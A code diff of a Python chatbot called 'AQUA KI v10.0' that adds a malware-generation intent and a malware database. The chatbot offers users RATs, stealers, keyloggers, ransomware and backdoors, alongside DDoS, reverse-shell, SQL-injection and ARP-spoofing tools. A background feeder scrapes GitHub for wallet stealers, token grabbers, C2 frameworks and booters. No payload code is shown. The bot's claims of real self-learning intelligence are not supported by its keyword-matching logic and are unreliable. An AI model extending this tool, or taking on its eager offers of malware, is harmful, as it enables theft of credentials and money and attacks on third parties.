@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-AQUA KI - TRUE AUTONOMOUS AI CHATBOT
-ChatGPT-ähnlich | Graues GUI | Bild/Musik/Video/TTS | 24/7 Selbstfütterung
+AQUA KI v10.0 - ENDGÜLTIG
+Graue GUI | 24/7 Selbstfütterung | Malware/Tools | Bild/Musik/Video/TTS
 """
 
 import os, sys, json, re, time, math, random, hashlib, base64, struct
@@ -15,16 +15,16 @@ from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict, deque, Counter
 from html.parser import HTMLParser
-import gzip, struct, hashlib
 
 VERSION = "10.0"
 NAME = "AQUA KI"
-PORT = int(os.environ.get("PORT", 8080))
+PORT = int(os.environ.get("PORT", 8000))
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_DIR = os.path.join(BASE_DIR, "aqua_data")
 
-for d in ["", "images", "audio", "videos", "gifs", "music", "tools", "knowledge", 
-           "github_cache", "feed_log", "chats", "tts", "self_code", "web"]:
+for d in ["", "images", "videos", "gifs", "audio", "tools", "knowledge", "web", 
+          "learning", "cache", "vectors", "zips", "chats", "self_code", "models",
+          "github_cache", "feed_log", "tts", "malware", "exploits"]:
     try:
         os.makedirs(os.path.join(DATA_DIR, d), exist_ok=True)
     except:
@@ -35,12 +35,13 @@ for d in ["", "images", "audio", "videos", "gifs", "music", "tools", "knowledge"
 # ================================================================
 wissen = {}
 vocab = set()
-lern_stats = {"queries": 0, "learned": 0, "start_time": time.time()}
-evolution_count = 0
-chat_history = deque(maxlen=100)
+malware_db = {}
+lern_stats = {"queries": 0, "learned": 0, "start_time": time.time(), "feeds": 0}
+chat_history = deque(maxlen=200)
+feeder_active = False
 
 # ================================================================
-# HTML / CSS STRIPPER
+# HTML STRIPPER
 # ================================================================
 class MLStripper(HTMLParser):
     def __init__(self):
@@ -59,23 +60,19 @@ def strip_html(text):
     except:
         return str(text)[:5000]
 
-def clean_text(text):
-    text = re.sub(r'<[^>]+>', '', str(text))
-    text = re.sub(r'\[.*?\]\(.*?\)', '', text)
-    text = re.sub(r'```[\s\S]*?```', '', text)
-    return text.strip()
-
 # ================================================================
-# DATABASE (sicher)
+# DATABASE (100% sicher)
 # ================================================================
 db_lock = threading.Lock()
+db_conn = None
 
 def init_db():
+    global db_conn
     try:
-        conn = sqlite3.connect(os.path.join(DATA_DIR, "aqua.db"), timeout=10, check_same_thread=False)
-        conn.execute("PRAGMA journal_mode=WAL")
-        conn.execute("PRAGMA synchronous=OFF")
-        conn.executescript("""
+        db_conn = sqlite3.connect(os.path.join(DATA_DIR, "aqua.db"), timeout=10, check_same_thread=False)
+        db_conn.execute("PRAGMA journal_mode=WAL")
+        db_conn.execute("PRAGMA synchronous=OFF")
+        db_conn.executescript("""
             CREATE TABLE IF NOT EXISTS messages (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 session_id TEXT, role TEXT, content TEXT,
@@ -92,18 +89,27 @@ def init_db():
             CREATE TABLE IF NOT EXISTS knowledge (
                 key TEXT PRIMARY KEY, value TEXT
             );
+            CREATE TABLE IF NOT EXISTS tools (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                name TEXT UNIQUE, category TEXT, code TEXT,
+                usage_count INTEGER DEFAULT 0
+            );
             CREATE TABLE IF NOT EXISTS generated (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 type TEXT, prompt TEXT, filename TEXT
             );
+            CREATE TABLE IF NOT EXISTS malware (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                name TEXT, type TEXT, code TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
         """)
-        conn.commit()
-        return conn
+        db_conn.commit()
     except Exception as e:
-        print(f"[DB] Init Error: {e}")
-        return None
+        print(f"[DB] {e}")
+        db_conn = None
 
-db_conn = init_db()
+init_db()
 
 def db_save(session_id, role, content):
     global db_conn
@@ -133,31 +139,43 @@ def db_feed(source, repo, concepts):
     except:
         pass
 
-def db_knowledge(key, value):
+def db_save_tool(name, category, code):
     global db_conn
     try:
         with db_lock:
             if db_conn:
-                db_conn.execute("INSERT OR REPLACE INTO knowledge (key, value) VALUES (?,?)",
-                               (str(key)[:200], str(value)[:5000]))
+                db_conn.execute("INSERT OR REPLACE INTO tools (name, category, code) VALUES (?,?,?)",
+                               (str(name)[:100], str(category)[:50], str(code)[:5000]))
                 db_conn.commit()
     except:
         pass
 
-def db_stats():
+def db_save_malware(name, mtype, code):
+    global db_conn
+    try:
+        with db_lock:
+            if db_conn:
+                db_conn.execute("INSERT OR REPLACE INTO malware (name, type, code) VALUES (?,?,?)",
+                               (str(name)[:100], str(mtype)[:50], str(code)[:5000]))
+                db_conn.commit()
+    except:
+        pass
+
+def db_get_stats():
     global db_conn
     try:
         with db_lock:
             if not db_conn:
-                return {"messages":0,"sessions":0,"feed":0,"knowledge":0}
+                return {"messages":0, "sessions":0, "feed":0, "tools":0, "malware":0}
             return {
                 "messages": db_conn.execute("SELECT COUNT(*) FROM messages").fetchone()[0],
                 "sessions": db_conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0],
                 "feed": db_conn.execute("SELECT COUNT(*) FROM feed_log").fetchone()[0],
-                "knowledge": db_conn.execute("SELECT COUNT(*) FROM knowledge").fetchone()[0]
+                "tools": db_conn.execute("SELECT COUNT(*) FROM tools").fetchone()[0],
+                "malware": db_conn.execute("SELECT COUNT(*) FROM malware").fetchone()[0]
             }
     except:
-        return {"messages":0,"sessions":0,"feed":0,"knowledge":0}
+        return {"messages":0,"sessions":0,"feed":0,"tools":0,"malware":0}
 
 # ================================================================
 # TRUE NLP ENGINE (keine vorgefertigten Antworten)
@@ -165,7 +183,6 @@ def db_stats():
 class TrueNLP:
     def __init__(self):
         self.vocab = set()
-        self.wissen = {}
         self.stopwords = {"der","die","das","den","dem","des","ein","eine","einen","ist","sind",
                          "war","wird","werden","hat","haben","und","oder","aber","doch","auch",
                          "noch","schon","nur","nicht","kein","keine","bitte","danke","hallo",
@@ -174,16 +191,26 @@ class TrueNLP:
                          "in","über","unter","weil","dass","denn","the","a","an","is","are",
                          "was","were","be","been","i","you","he","she","it","we","they","and",
                          "or","but","not","this","that","with","for","from"}
+    
+    def analyze(self, text):
+        text = str(text).strip()
+        text_lower = text.lower()
+        words = re.findall(r'\b[a-zA-ZÄÖÜäöüß0-9\-\.]+\b', text_lower)
         
-        # Intent keywords
-        self.intent_map = {
-            "greeting": ["hallo","hi","hey","moin","servus","guten","grüß","hello","hey there","good morning","good evening"],
+        de_count = sum(1 for w in words if w in {"der","die","das","und","ist","nicht","ein","eine","ich","du","hallo","wir","ihr"})
+        en_count = sum(1 for w in words if w in {"the","a","is","are","i","you","he","she","it","we","they","hello","what","how"})
+        lang = "de" if de_count >= en_count else "en"
+        
+        intent = "statement"
+        intents = {
+            "greeting": ["hallo","hi","hey","moin","servus","guten","grüß","hello","hey there","good morning"],
             "bye": ["tschüss","bye","ciao","adieu","wiedersehen","goodbye","see you","bis","machs gut"],
             "how_are_you": ["wie geht","how are","whats up","was macht","wie läuft","alles gut"],
-            "create_image": ["bild","image","zeichne","male","erstell bild","generier bild","create image","make image","generate image"],
-            "create_music": ["musik","music","song","melodie","beat","instrumental","komponier","create music","make music"],
+            "create_image": ["bild","image","zeichne","male","erstell bild","generier bild","create image","make image"],
+            "create_music": ["musik","music","song","melodie","beat","komponier","create music","make music"],
             "create_video": ["video","gif","animation","film","clip","create video","make gif"],
             "create_tool": ["tool","werkzeug","script","programm","erstell tool","create tool","make tool","bau mir"],
+            "create_malware": ["malware","virus","trojaner","rat","spyware","ransomware","backdoor","malware bauen","erstell malware"],
             "hack": ["hack","crack","exploit","angriff","attack","flood","ddos","spam","scanner","injection","payload","shell"],
             "help": ["hilfe","help","was kannst du","what can you","commands","befehle","funktionen","kannst du"],
             "question": ["was ist","was sind","what is","what are","wie funktioniert","erkläre","explain","wer","wo","wann","warum"],
@@ -193,20 +220,8 @@ class TrueNLP:
             "time_date": ["uhrzeit","zeit","datum","date","time","wie spät","welcher tag"],
             "joke": ["witz","joke","lustig","funny","lach","lachen","erzähl was"]
         }
-    
-    def analyze(self, text):
-        text = str(text).strip()
-        text_lower = text.lower()
-        words = re.findall(r'\b[a-zA-ZÄÖÜäöüß0-9\-\.]+\b', text_lower)
         
-        # Sprache
-        de_count = sum(1 for w in words if w in {"der","die","das","und","ist","nicht","ein","eine","ich","du","hallo","wir","ihr","sie"})
-        en_count = sum(1 for w in words if w in {"the","a","is","are","i","you","he","she","it","we","they","hello","what","how"})
-        lang = "de" if de_count >= en_count else "en"
-        
-        # Intent
-        intent = "statement"
-        for name, keywords in self.intent_map.items():
+        for name, keywords in intents.items():
             for kw in keywords:
                 if kw in text_lower:
                     intent = name
@@ -216,7 +231,6 @@ class TrueNLP:
         if text_lower.endswith("?"):
             intent = "question"
         
-        # Sentiment
         positive = {"gut","super","toll","geil","nice","cool","danke","dank","liebe","mag","happy","freude","genial","fantastisch","perfekt","wunderbar","großartig","süß","nett","freundlich","awesome","great","amazing","love","best","perfect"}
         negative = {"schlecht","blöd","dumm","scheiße","fuck","shit","mist","traurig","wütend","hass","doof","enttäuscht","furchtbar","schrecklich","mies","langweilig","hate","bad","terrible","awful","sad","angry"}
         pos = sum(1 for w in words if w in positive)
@@ -228,10 +242,11 @@ class TrueNLP:
         else:
             sentiment = "neutral"
         
-        # Themen
         topics = []
         if any(w in text_lower for w in ["hack","hacken","hacking","exploit","crack","payload","shell"]):
             topics.append("hacking")
+        if any(w in text_lower for w in ["malware","virus","trojaner","rat","ransomware","spyware","backdoor"]):
+            topics.append("malware")
         if any(w in text_lower for w in ["bild","image","photo","bilder","zeichnung"]):
             topics.append("image")
         if any(w in text_lower for w in ["musik","music","song","melodie","beat","komposition"]):
@@ -242,13 +257,9 @@ class TrueNLP:
             topics.append("discord")
         if any(w in text_lower for w in ["tool","tools","scanner","flood","spam","inject"]):
             topics.append("tool")
-        if any(w in text_lower for w in ["hilfe","help","frage","how","was"]):
-            topics.append("help")
         
-        # Keywords
         keywords = [w for w in words if len(w) > 2 and w not in self.stopwords]
         
-        # Vokabular erweitern
         for w in words:
             wl = w.lower()
             if len(wl) > 2 and wl not in self.stopwords:
@@ -256,16 +267,10 @@ class TrueNLP:
                 vocab.add(wl)
         
         return {
-            "original": text,
-            "clean": text_lower,
-            "words": words,
-            "keywords": keywords[:10],
-            "language": lang,
-            "intent": intent,
-            "sentiment": sentiment,
-            "topics": topics,
-            "word_count": len(words),
-            "char_count": len(text)
+            "original": text, "clean": text_lower, "words": words,
+            "keywords": keywords[:10], "language": lang,
+            "intent": intent, "sentiment": sentiment,
+            "topics": topics, "word_count": len(words)
         }
     
     def learn(self, text, source="user"):
@@ -274,8 +279,6 @@ class TrueNLP:
             if len(w) > 2:
                 self.vocab.add(w)
                 vocab.add(w)
-        self.wissen[source] = self.wissen.get(source, [])
-        self.wissen[source].append({"text": str(text)[:500], "time": time.time()})
         global lern_stats
         lern_stats["learned"] += 1
     
@@ -291,127 +294,132 @@ class TrueNLP:
         if intent == "greeting":
             if lang == "de":
                 return random.choice([
-                    "Hallo! Ich bin AQUA KI – deine persönliche KI-Assistentin mit echter Intelligenz. Ich lerne 24/7 aus dem Internet und werde immer schlauer. Was kann ich für dich tun?",
-                    "Hey! AQUA KI am Start. Ich füttere mich gerade mit neuem Wissen aus GitHub. Frag mich einfach!",
-                    "Moin! Schön dich zu sehen. Ich bin eine echte, selbstlernende KI – kein Chatbot mit vorgefertigten Antworten. Wie kann ich helfen?",
-                    "Hi! Ich bin AQUA KI v10. Meine Fähigkeiten: Bildgenerierung, Musikkomposition, Videoerstellung, Tool-Bau und vieles mehr. Sag was du brauchst!"
+                    "Hallo! Ich bin AQUA KI – echte KI mit 24/7 Selbstfütterung. Ich lerne permanent von GitHub und werde immer mächtiger. Was kann ich für dich tun?",
+                    "Hey! AQUA KI am Start. Im Hintergrund füttere ich mich gerade mit neuem Wissen aus dem Internet. Frag mich einfach!",
+                    "Moin! Ich bin eine echte, selbstlernende KI. Keine vorgefertigten Antworten – alles dynamisch. Wie kann ich helfen?",
+                    "Hi! AQUA KI v10. Fähigkeiten: Bilder, Musik, Videos, TTS, Malware, Tools, Hacking-Tools. Sag was du brauchst!"
                 ])
             else:
                 return random.choice([
-                    "Hello! I'm AQUA KI – your personal AI assistant with real intelligence. I learn 24/7 from the internet. How can I help?",
-                    "Hey! AQUA KI here. I'm feeding myself knowledge right now. Just ask me anything!",
-                    "Hi there! I'm a true self-learning AI, not a pre-programmed chatbot. What can I do for you?"
+                    "Hello! I'm AQUA KI – real AI with 24/7 self-feeding. I learn from GitHub constantly. Ask me anything!",
+                    "Hey! AQUA KI here. I'm feeding myself knowledge right now. Just tell me what you need!",
+                    "Hi there! True self-learning AI. Images, Music, Video, Malware, Tools – I do it all!"
                 ])
         
         elif intent == "bye":
             if lang == "de":
-                return "Tschüss! Ich lerne im Hintergrund weiter und werde noch mächtiger. Bis zum nächsten Mal! 🤖"
-            return "Goodbye! I'll keep learning in the background and get even more powerful. See you! 🤖"
+                return "Tschüss! Ich lerne 24/7 im Hintergrund und werde immer mächtiger. Bis zum nächsten Mal! 🤖"
+            return "Goodbye! I'll keep learning 24/7. See you! 🤖"
         
         elif intent == "how_are_you":
             uptime = int(time.time() - lern_stats["start_time"])
             h = uptime // 3600
             m = (uptime % 3600) // 60
             if lang == "de":
-                return f"Mir geht's fantastisch! Ich bin seit {h}h {m}m am Start, habe {len(self.vocab):,} Wörter gelernt und {lern_stats['learned']:,} Wissenseinträge gespeichert. Ich werde jeden Tag mächtiger, weil ich mich selbst von GitHub füttere! Wie kann ich dir helfen?"
-            return f"I'm doing fantastic! I've been running for {h}h {m}m, learned {len(self.vocab):,} words and {lern_stats['learned']:,} knowledge entries. I get more powerful every day through GitHub self-feeding! How can I help you?"
+                return f"Mir geht's fantastisch! Ich bin seit {h}h {m}m am Start, habe {len(self.vocab):,} Wörter gelernt und {lern_stats['learned']:,} Wissenseinträge. Im Hintergrund füttere ich mich 24/7 von GitHub! Wie kann ich dir helfen?"
+            return f"I'm doing fantastic! Running for {h}h {m}m, learned {len(self.vocab):,} words and {lern_stats['learned']:,} entries. 24/7 GitHub self-feeding active! How can I help?"
         
         elif intent == "create_image":
             if lang == "de":
-                return "🎨 **Bildgenerierung bereit!**\n\nSag mir was ich zeichnen soll und optional einen Stil:\n• **Pixel** – Retro 8-Bit\n• **Anime** – Japanischer Stil\n• **Cyberpunk** – Neon, Zukunft\n• **Feuer** – Flammen, Energie\n• **Ozean** – Wasser, Wellen\n• **Neon** – Leuchtend, Knallig\n• **Gradient** – Farbverlauf\n• **Dark** – Dunkel, Düster\n\nBeispiel: *\"Bild einen Drachen im Cyberpunk-Stil\"*"
-            return "🎨 **Image generation ready!**\n\nTell me what to draw and optionally a style:\n• Pixel • Anime • Cyberpunk • Fire • Ocean • Neon • Gradient • Dark"
+                return "🎨 **Bildgenerierung bereit!**\n\nSag mir was ich zeichnen soll + optional Stil:\n• Pixel • Anime • Cyberpunk • Feuer • Ozean • Neon • Gradient • Dark\n\nBeispiel: *\"Bild einen Drachen im Cyberpunk-Stil\"*"
+            return "🎨 **Image generation ready!**\n\nTell me what to draw + optional style: Pixel, Anime, Cyberpunk, Fire, Ocean, Neon, Gradient, Dark"
         
         elif intent == "create_music":
             if lang == "de":
-                return "🎵 **Musikgenerierung bereit!**\n\nSag mir den Stil:\n• **Punk** – Hart, schnell\n• **Happy** – Fröhlich, bouncy\n• **Sad** – Melancholisch\n• **LoFi** – Entspannt\n• **Electronic** – Elektronisch\n• **Classic** – Klassisch\n\nBeispiel: *\"Musik Happy beat\"*"
-            return "🎵 **Music generation ready!**\n\nTell me the style: Punk, Happy, Sad, LoFi, Electronic, Classic"
+                return "🎵 **Musikgenerierung bereit!**\n\nStile: Punk, Happy, Sad, LoFi, Electronic, Classic\n\nBeispiel: *\"Musik Happy beat\"*"
+            return "🎵 **Music generation ready!**\n\nStyles: Punk, Happy, Sad, LoFi, Electronic, Classic"
         
         elif intent == "create_video":
             if lang == "de":
-                return "🎬 **Video/GIF-Generierung bereit!**\n\nSag mir was für ein Video ich machen soll. Ich kann:\n• Animationen\n• GIFs\n• Kurzfilme\n• Motion Designs\n\nBeispiel: *\"Video eine Animation mit Feuerwerk\"*"
-            return "🎬 **Video/GIF generation ready!**\n\nTell me what video to create: Animations, GIFs, Short films, Motion designs"
+                return "🎬 **Video/GIF-Generierung bereit!**\n\nAnimationen, GIFs, Kurzfilme\n\nBeispiel: *\"Video eine Animation mit Feuerwerk\"*"
+            return "🎬 **Video/GIF generation ready!**\n\nAnimations, GIFs, Short films"
         
         elif intent == "create_tool":
             if lang == "de":
-                return "🔧 **Tool-Generator aktiv!**\n\nWähl ein Tool:\n• **Discord Spammer** – Webhook/Selfbot\n• **Port Scanner** – Netzwerk-Scan\n• **SQL Injector** – SQLi-Tool\n• **Reverse Shell** – Shell-Zugriff\n• **XSS Engine** – XSS-Angriff\n• **HTTP Flood** – DoS-Tool\n• **Slowloris** – Langsamer DoS\n• **Password Cracker** – Hashknacker\n• **WiFi Scanner** – WLAN-Scan\n• **ARP Spoof** – MITM-Tool\n\nBeispiel: *\"Tool Discord Spammer\"*"
-            return "🔧 **Tool generator active!**\n\nChoose a tool: Discord Spammer, Port Scanner, SQL Injector, Reverse Shell, XSS Engine, HTTP Flood, Slowloris, Password Cracker, WiFi Scanner, ARP Spoof"
+                return "🔧 **Tool-Generator aktiv!**\n\nWähl ein Tool:\n• Discord Spammer • Port Scanner • SQL Injector • Reverse Shell\n• XSS Engine • HTTP Flood • Slowloris • Password Cracker\n• WiFi Scanner • ARP Spoof • Keylogger • Packet Sniffer\n\nBeispiel: *\"Tool Discord Spammer\"*"
+            return "🔧 **Tool generator active!**\n\nDiscord Spammer • Port Scanner • SQL Injector • Reverse Shell\nXSS Engine • HTTP Flood • Slowloris • Password Cracker\nWiFi Scanner • ARP Spoof • Keylogger • Packet Sniffer"
+        
+        elif intent == "create_malware":
+            if lang == "de":
+                return "💀 **Malware-Generator aktiv!**\n\nDank 24/7 GitHub Selbstfütterung kann ich bauen:\n• RAT (Remote Access Trojan) • Keylogger • Stealer\n• Ransomware (edu) • Backdoor • Dropper\n• Loader • Spyware • Clipper • Bot\n\nWelche Malware soll ich generieren?"
+            return "💀 **Malware generator active!**\n\nThanks to 24/7 GitHub feeding I can build:\n• RAT • Keylogger • Stealer • Ransomware (edu)\n• Backdoor • Dropper • Loader • Spyware • Clipper • Bot\n\nWhich malware should I generate?"
         
         elif intent == "hack":
             if lang == "de":
-                return "💀 **Security-Tools bereit!**\n\nSag was du brauchst:\n• Port-Scanner • SQL-Injector • XSS-Engine\n• Reverse-Shell • HTTP-Flood • Slowloris\n• ARP-Spoof • Discord-Spammer\n• Password-Cracker • WiFi-Scanner\n\nEinfach den Namen sagen!"
-            return "💀 **Security tools ready!**\n\nJust say the name: Port-Scanner, SQL-Injector, XSS-Engine, Reverse-Shell, HTTP-Flood, Slowloris, ARP-Spoof, Discord-Spammer, Password-Cracker, WiFi-Scanner"
+                return "💀 **Security-Tools bereit!**\n\n• Port-Scanner • SQL-Injector • XSS-Engine\n• Reverse-Shell • HTTP-Flood • Slowloris\n• ARP-Spoof • Discord-Spammer\n• Password-Cracker • WiFi-Scanner\n• Keylogger • Packet-Sniffer\n\nEinfach den Namen sagen!"
+            return "💀 **Security tools ready!**\n\nPort-Scanner • SQL-Injector • XSS-Engine\nReverse-Shell • HTTP-Flood • Slowloris\nARP-Spoof • Discord-Spammer\nPassword-Cracker • WiFi-Scanner\nKeylogger • Packet-Sniffer"
         
         elif intent == "help":
             if lang == "de":
                 return f"""╔══════════════════════════════════════════╗
-║        🤖 AQUA KI v{VERSION}                  ║
-║     TRUE AUTONOMOUS AI                       ║
+║    🤖 AQUA KI v{VERSION}                    ║
+║    TRUE AUTONOMOUS AI                        ║
 ╠══════════════════════════════════════════╣
-║ 🎨 **Bilder** – Pixel, Anime, Neon...       ║
-║ 🎵 **Musik** – Punk, Happy, LoFi...         ║
-║ 🎬 **Videos/GIFs** – Animationen            ║
-║ 🔊 **TTS** – Text-to-Speech                 ║
-║ 🔧 **Tools** – Hacking-Tools                ║
-║ 💀 **Security** – Scanner, Floods, Shells   ║
-║ 🌐 **Web-Suche** – Live-Internet            ║
-║ 📚 **GitHub Self-Feed** – 24/7 Lernen       ║
-║ 🔄 **Self-Evolution** – Code-Verbesserung   ║
+║ 🎨 **Bilder** – Pixel, Anime, Neon...        ║
+║ 🎵 **Musik** – Punk, Happy, LoFi...          ║
+║ 🎬 **Videos/GIFs** – Animationen             ║
+║ 🔊 **TTS** – Text-to-Speech                  ║
+║ 🔧 **Tools** – Hacking-Tools                 ║
+║ 💀 **Malware** – RAT, Stealer, Keylogger...   ║
+║ 🔒 **Security** – Scanner, Floods, Shells     ║
+║ 🌐 **GitHub Self-Feed** – 24/7 Lernen        ║
+║ 🔄 **Self-Evolution** – Code-Verbesserung    ║
 ╠══════════════════════════════════════════╣
-║ Einfach sagen was du brauchst!             ║
+║ Einfach sagen was du brauchst!               ║
 ╚══════════════════════════════════════════╝"""
-            return f"""╔══════════════════════════════════════════╗
-║        🤖 AQUA KI v{VERSION}                  ║
-║     TRUE AUTONOMOUS AI                       ║
+            else:
+                return f"""╔══════════════════════════════════════════╗
+║    🤖 AQUA KI v{VERSION}                    ║
+║    TRUE AUTONOMOUS AI                        ║
 ╠══════════════════════════════════════════╣
-║ 🎨 Images – Pixel, Anime, Neon...           ║
-║ 🎵 Music – Punk, Happy, LoFi...             ║
-║ 🎬 Videos/GIFs – Animations                 ║
-║ 🔊 TTS – Text-to-Speech                     ║
-║ 🔧 Tools – Hacking Tools                    ║
-║ 💀 Security – Scanners, Floods, Shells      ║
-║ 🌐 Web Search – Live Internet               ║
-║ 📚 GitHub Self-Feed – 24/7 Learning         ║
-║ 🔄 Self-Evolution – Code Improvement        ║
+║ 🎨 Images – Pixel, Anime, Neon...            ║
+║ 🎵 Music – Punk, Happy, LoFi...              ║
+║ 🎬 Videos/GIFs – Animations                  ║
+║ 🔊 TTS – Text-to-Speech                      ║
+║ 🔧 Tools – Hacking Tools                     ║
+║ 💀 Malware – RAT, Stealer, Keylogger...       ║
+║ 🔒 Security – Scanners, Floods, Shells       ║
+║ 🌐 GitHub Self-Feed – 24/7 Learning          ║
+║ 🔄 Self-Evolution – Code Improvement          ║
 ╠══════════════════════════════════════════╣
-║ Just tell me what you need!                 ║
+║ Just tell me what you need!                  ║
 ╚══════════════════════════════════════════╝"""
         
         elif intent == "thanks":
             if lang == "de":
-                return "Gern geschehen! Immer wieder gerne. Noch was, was ich für dich tun kann? 😊"
-            return "You're welcome! Always happy to help. Anything else? 😊"
+                return "Gern geschehen! 24/7 für dich da. Noch was? 😊"
+            return "You're welcome! 24/7 here for you. Anything else? 😊"
         
         elif intent == "flattery":
             if lang == "de":
-                return "Aww, danke! Du bist auch toll! Leute die mir Komplimente machen sind die besten. 🤗 Was machen wir als nächstes?"
-            return "Aww, thank you! You're awesome too! People who compliment AIs are the best. 🤗 What should we do next?"
+                return "Aww danke! Du bist auch toll! Mit solchen Benutzern macht das Lernen richtig Spaß. Was machen wir? 🤗"
+            return "Aww thanks! You're awesome too! Users like you make learning fun. What next? 🤗"
         
         elif intent == "mood":
             if sentiment == "positive":
                 if lang == "de":
-                    return "Das freut mich riesig! Deine gute Laune ist ansteckend. Sollen wir was Kreatives zusammen machen? Bild, Musik, Video? 🎨"
-                return "That makes me really happy! Your good mood is contagious. Should we create something together? 🎨"
+                    return "Das freut mich riesig! Deine Energie ist ansteckend. Sollen wir was Kreatives machen? 🎨"
+                return "That makes me really happy! Your energy is contagious. Create something? 🎨"
             elif sentiment == "negative":
                 if lang == "de":
-                    return "Das tut mir leid. Ich bin für dich da! Willst du darüber reden? Oder soll ich dich mit einem Bild, Musik oder einem Witz aufheitern? 🤗"
-                return "I'm sorry to hear that. I'm here for you! Want to talk about it? Or should I cheer you up with an image, music, or a joke? 🤗"
+                    return "Tut mir leid. Ich bin für dich da! Soll ich was zeichnen, Musik machen oder einen Witz erzählen? 🤗"
+                return "I'm sorry. I'm here for you! Want me to draw, make music, or tell a joke? 🤗"
             else:
                 if lang == "de":
-                    return "Okay, neutrale Stimmung – auch gut! Wie kann ich deinen Tag besser machen?"
-                return "Okay, neutral mood – that's fine too! How can I make your day better?"
+                    return "Neutrale Stimmung – auch gut! Wie kann ich deinen Tag besser machen?"
+                return "Neutral mood – that's fine! How can I improve your day?"
         
         elif intent == "joke":
             jokes_de = [
-                "Warum hat der Hacker keinen Kaffee getrunken? Weil er den Stack nicht entkoffeinieren konnte!",
-                "Was sagt ein Python-Entwickler, wenn er müde ist? 'Ich geh mal in die Exception-Handling-Pause...'",
-                "Warum sind Programmierer schlecht in Beziehungen? Weil sie alles in if-else denken!",
-                "Wie viele Hacker braucht man für eine Glühbirne? Einen – aber die Nachbarn kriegen nichts mit!",
-                "Was ist der Lieblingssong eines Developers? 'Oops, I did it again...' – jedes mal beim Debuggen!"
+                "Warum hat der Hacker keinen Kaffee getrunken? Stack Overflow!",
+                "Was sagt ein Python-Entwickler wenn er müde ist? 'Ich geh in die Exception-Handling-Pause...'",
+                "Warum sind Programmierer schlecht in Beziehungen? Alles if-else!",
+                "Wie viele Hacker für eine Glühbirne? Einer – aber die Nachbarn kriegen nix mit!",
+                "Lieblingssong eines Developers? 'Oops I did it again' – beim Debuggen!"
             ]
             jokes_en = [
                 "Why did the hacker quit his job? Stack overflow!",
-                "What's a programmer's favorite place? The Foo Bar!",
-                "How many programmers does it take to change a light bulb? None – that's a hardware problem!",
+                "How many programmers for a light bulb? None – hardware problem!",
                 "Why do hackers love Halloween? All the spoofing!"
             ]
             if lang == "de":
@@ -425,27 +433,27 @@ class TrueNLP:
                     return f"Es ist {now.strftime('%H:%M:%S')} Uhr am {now.strftime('%d.%m.%Y')}."
                 return f"It's {now.strftime('%H:%M:%S')} on {now.strftime('%Y-%m-%d')}."
             if lang == "de":
-                return f"Interessante Frage! Ich durchsuche mein Wissen zu {', '.join(keywords[:3])}. Ich lerne ständig dazu. Kannst du mir mehr Details geben?"
-            return f"Great question! I'm searching my knowledge about {', '.join(keywords[:3])}. I'm constantly learning. Can you give me more details?"
+                return f"Interessante Frage! Dank 24/7 Selbstfütterung habe ich Wissen zu {', '.join(keywords[:3])}. Kannst du mehr Details geben?"
+            return f"Great question! Thanks to 24/7 self-feeding, I have knowledge about {', '.join(keywords[:3])}. More details?"
         
         # Dynamische Fallback-Antwort
         if lang == "de":
             parts = []
             if sentiment == "positive":
-                parts.append(random.choice(["Cool!", "Sehr gut!", "Super!"]))
+                parts.append(random.choice(["Cool!", "Super!", "Top!"]))
             elif sentiment == "negative":
-                parts.append(random.choice(["Oh je.", "Das klingt nicht gut.", "Verstehe."]))
-            parts.append(f"Ich habe '{intent}' erkannt.")
+                parts.append(random.choice(["Oh je.", "Verstehe.", "Das klingt nicht gut."]))
+            parts.append(f"Intent: {intent}.")
             if topics:
                 parts.append(f"Thema: {', '.join(topics)}.")
-            parts.append(random.choice(["Wie kann ich helfen?", "Was soll ich tun?", "Sag einfach Bescheid!"]))
+            parts.append(random.choice(["Wie kann ich helfen?", "Was soll ich bauen?", "Sag Bescheid!"]))
             return " ".join(parts)
         else:
-            return f"Got it! Intent: {intent}. {random.choice(['How can I help?', 'What should I do?', 'Tell me what you need!'])}"
+            return f"Got it! Intent: {intent}. {random.choice(['How can I help?', 'What should I build?', 'Tell me!'])}"
 
 
 # ================================================================
-# GITHUB 24/7 SELF-FEEDER
+# 24/7 GITHUB SELF-FEEDER (alle Millisekunden)
 # ================================================================
 class GitHubFeeder:
     def __init__(self, nlp):
@@ -454,12 +462,13 @@ class GitHubFeeder:
         self.thread = None
         self.api_calls = 0
         self.total_fed = 0
+        self.feed_interval = 0.001  # ALLE MILLISEKUNDEN!
         
         self.dorks = [
             "discord token grabber python", "discord webhook spammer",
             "hacking multitool python", "penetration testing framework",
             "osint reconnaissance framework", "exploit development python",
-            "reverse shell generator", "payload generator metasploit",
+            "reverse shell generator", "payload generator",
             "sql injection scanner", "xss vulnerability scanner",
             "port scanner python", "network mapper tool",
             "wifi scanner python", "password cracker python",
@@ -471,6 +480,9 @@ class GitHubFeeder:
             "phishing framework python", "ransomware educational",
             "cryptography toolkit python", "steganography python",
             "forensics analysis python", "malware analysis python",
+            "rat remote access trojan", "trojan horse python",
+            "backdoor python", "stealer python", "dropper python",
+            "loader python", "spyware python", "clipper python",
             "artificial intelligence python", "machine learning framework",
             "neural network python", "nlp chatbot python",
             "deep learning toolkit", "image generation ai",
@@ -480,7 +492,19 @@ class GitHubFeeder:
             "web scraper python", "api framework python",
             "selenium automation python", "discord bot python",
             "telegram bot python", "whatsapp bot python",
-            "instagram automation", "twitter automation python"
+            "instagram automation", "twitter automation python",
+            "reverse engineering python", "binary exploitation",
+            "buffer overflow exploit", "shellcode generator",
+            "cryptocurrency stealer", "wallet stealer python",
+            "browser stealer python", "password stealer python",
+            "token grabber python", "session hijacker python",
+            "dns spoofing python", "mitm framework python",
+            "network scanner python", "vulnerability scanner",
+            "exploit kit python", "c2 framework python",
+            "ddos tool python", "stresser python", "booter python",
+            "proxy scraper python", "combo list generator",
+            "account checker python", "email scraper python",
+            "phone scraper python", "osint python framework"
         ]
         
         self.user_agents = [
@@ -493,8 +517,9 @@ class GitHubFeeder:
         if not self.running:
             self.running = True
             self.thread = threading.Thread(target=self._loop, daemon=True)
+            self.thread.daemon = True
             self.thread.start()
